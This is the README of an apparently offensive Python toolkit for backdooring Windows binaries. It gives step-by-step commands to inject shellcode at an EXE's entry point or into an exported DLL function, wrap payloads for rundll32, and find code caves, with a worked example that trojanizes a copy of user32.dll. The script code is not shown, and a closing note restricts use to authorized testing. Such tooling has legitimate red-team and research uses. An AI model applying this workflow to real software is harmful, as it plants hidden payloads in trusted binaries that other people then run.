# PE-Backdoor

A collection of Python scripts for PE/DLL backdooring and analysis:

- **backdoor.py** - Inject shellcode at the EntryPoint of a .exe file. Will not call the original entry point
- **dll-backdoor.py** - Basic DLL export function backdoor (original version)
- **dll-function-backdoor.py** - Enhanced DLL function backdoor with listing and rundll32.exe support ⭐ NEW
- **shellcode-wrapper.py** - Wrap shellcode with proper calling conventions for rundll32.exe ⭐ NEW
- **cave.py** - Find basic code caves statically by null bytes

## Quick Start - Backdoor DLL Functions for rundll32.exe

The new `dll-function-backdoor.py` makes it easy to backdoor DLL exported functions for execution via rundll32.exe:

### 1. List Available Exported Functions

```bash
python dll-function-backdoor.py --dll target.dll --list
```

This will show all exported functions with their RVAs and sections.

### 2. Wrap Your Shellcode (Optional but Recommended)

Wrap your raw shellcode with proper calling convention handling:

```bash
# For x86 DLLs
python shellcode-wrapper.py --input payload.bin --output wrapped.bin --arch x86 --wrapper full

# For x64 DLLs
python shellcode-wrapper.py --input payload.bin --output wrapped.bin --arch x64 --wrapper full
```

### 3. Backdoor the Function

```bash
python dll-function-backdoor.py --dll target.dll --function FunctionName --shellcode wrapped.bin --output backdoored.dll
```

### 4. Execute via rundll32

```bash
rundll32.exe backdoored.dll,FunctionName
```

## Detailed Usage

### dll-function-backdoor.py

Enhanced DLL function backdoor with better error handling and validation:

```bash
# List all exports
python dll-function-backdoor.py --dll target.dll --list

# Backdoor a specific function
python dll-function-backdoor.py \
    --dll target.dll \
    --function MyFunction \
    --shellcode payload.bin \
    --output backdoored.dll
```

Features:
- Lists all exported functions with details
- Validates section executability
- Checks available space
- Provides clear error messages
- Ready for rundll32.exe execution

### shellcode-wrapper.py

Wraps raw shellcode with proper calling convention stubs:

```bash
# Full wrapper (recommended) - saves/restores registers
python shellcode-wrapper.py \
    --input raw_payload.bin \
    --output wrapped_payload.bin \
    --arch x64 \
    --wrapper full

# Simple wrapper - minimal overhead
python shellcode-wrapper.py \
    --input raw_payload.bin \
    --output wrapped_payload.bin \
    --arch x86 \
    --wrapper simple
```

Wrapper types:
- **full**: Includes stack frame setup, register saves/restores, proper cleanup
- **simple**: Minimal wrapper, just adds return instruction with proper cleanup

### backdoor.py

Original PE backdoor script:

```bash
# Overwrite entry point
python backdoor.py --input program.exe --shellcode payload.bin --output backdoored.exe

# Inject at start of .text section
python backdoor.py --input program.exe --shellcode payload.bin --output backdoored.exe --start
```

### cave.py

Find code caves for injection:

```bash
# Find caves of at least 100 bytes (default)
python cave.py --input binary.exe

# Find caves of at least 500 bytes
python cave.py --input binary.exe --min 500
```

## Example Workflow

Complete workflow to backdoor a DLL function:

```bash
# 1. List available functions
python dll-function-backdoor.py --dll C:\\Windows\\System32\\user32.dll --list

# 2. Generate or obtain your shellcode (e.g., calc.exe payload)
# For this example, assume you have payload.bin

# 3. Wrap the shellcode
python shellcode-wrapper.py -i payload.bin -o wrapped.bin -a x64 -w full

# 4. Backdoor the function
python dll-function-backdoor.py \
    -d user32.dll \
    -f AboutDlgProc \
    -s wrapped.bin \
    -o user32_backdoor.dll

# 5. Execute
rundll32.exe user32_backdoor.dll,AboutDlgProc
```

## Technical Details

### Calling Conventions

**x86 (__stdcall)**:
- Parameters pushed right-to-left on stack
- Callee cleans up stack (ret 0x10 for 4 parameters)
- Used by rundll32.exe for x86 DLLs

**x64 (Microsoft x64)**:
- First 4 params in RCX, RDX, R8, R9
- Additional params on stack
- Requires 32-byte shadow space
- Used by rundll32.exe for x64 DLLs

### rundll32.exe Function Signature

rundll32.exe expects exported functions to match:
```c
void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
```

The shellcode-wrapper.py tool handles this automatically.

## Requirements

```bash
pip install pefile
```

## Warnings

⚠️ These tools are for authorized security testing, research, and educational purposes only.
⚠️ Always test in isolated environments first.
⚠️ Ensure you have permission before testing on any systems.

## Notes

- The enhanced tools provide better error handling and validation
- Wrapped shellcode is more reliable than raw shellcode for rundll32.exe
- Always check that target sections are executable
- Test backdoored binaries in safe environments first
- Some antivirus software will detect these modifications 
